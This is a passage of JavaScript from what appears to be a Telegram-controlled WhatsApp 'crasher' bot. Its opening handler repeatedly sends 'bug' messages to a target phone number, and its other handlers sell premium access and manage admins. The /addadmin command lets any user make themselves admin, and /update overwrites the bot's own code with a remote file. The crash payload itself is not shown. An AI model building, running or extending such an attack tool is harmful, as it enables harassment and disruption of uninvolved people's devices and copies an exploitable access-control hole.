# ɢᴏᴊᴏ ᴄʀᴀꜱʜᴇʀ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
  for (let i = 0; i <= 30; i++) {   
     await fvckMark(target); 
     await sleep(3500);
  }
  
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# ɢᴏᴊᴏ ᴄʀᴀꜱʜᴇʀ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const text = match[1];

    if (!text) {
        return bot.sendMessage(chatId, "Mana Link Channel Nya?");
    }

    if (!text.includes("https://whatsapp.com/channel/")) {
        return bot.sendMessage(chatId, "Invalid link");
    }

    try {
        let result = text.split("https://whatsapp.com/channel/")[1];
        let res = await Xuu.newsletterMetadata("invite", result);

        let teks = `*ID :* ${res.id}
*Name :* ${res.name}
*Total Followers :* ${res.subscribers}
*Status :* ${res.state}
*Verified :* ${res.verification == "VERIFIED" ? "Verified" : "No"}`;

        bot.sendMessage(chatId, teks, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "Copy ID",
                            callback_data: `copy_${res.id}`
                        }
                    ]
                ]
            }
        });

    } catch (err) {
        bot.sendMessage(chatId, "Gagal mengambil data channel.");
        console.log(err);
    }
});


bot.onText(/\/reqpair (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "🤬 *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

const moment = require('moment');

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "🙈 You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "🙈 Missing input. Please provide a user ID and duration. Example: /addprem 123456789 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "🙈 Missing input. Please specify a duration. Example: /addprem 123456789 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "🙈 Invalid input. User ID must be a number. Example: /addprem 123456789 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "🙈 Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `🔥 User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `🔥 User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/cekprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "🙈 You are not authorized to view the prem list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - R E G I S T \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "🙈 Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "🙈 Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `🔥 User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `🙈 User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "🙈 You are not authorized to remove prem users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "🙈 Please provide a user ID. Example: /prem 123456789");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "🙈 Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `🙈 User ${userId} is not in the regis list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `🔥 User ${userId} has been removed from the prem list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "🤬 *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "🙈 Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "🙈 Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `🔥 User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `🙈 User ${userId} is not an admin.`);
    }
});

// ===== /update =====
bot.onText(/\/update/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId,
      "❌ Hanya owner yang bisa menggunakan command ini.",
      { parse_mode: "HTML" }
    );
  }

  const statusMsg = await bot.sendMessage(chatId,
    "<code>⏳ Mengecek update dari GitHub...</code>",
    { parse_mode: "HTML" }
  );

  try {
    const fileRes = await axios.get(RAW_INDEX_URL + "?t=" + Date.now(), {
      responseType: "text",
      transformResponse: [(d) => d],
      timeout: 15000
    });

    require("fs").writeFileSync("./index.js", fileRes.data);

    await bot.editMessageText(
      `<code>✅ File index.js berhasil diupdate dari GitHub!
⏳ Bot akan restart...</code>`,
      { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
    );

    setTimeout(() => process.exit(0), 2000);
  } catch (e) {
    await bot.editMessageText(
      `<code>❌ Gagal update: ${e.message}</code>`,
      { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
    );
  }
});

// isi function bug
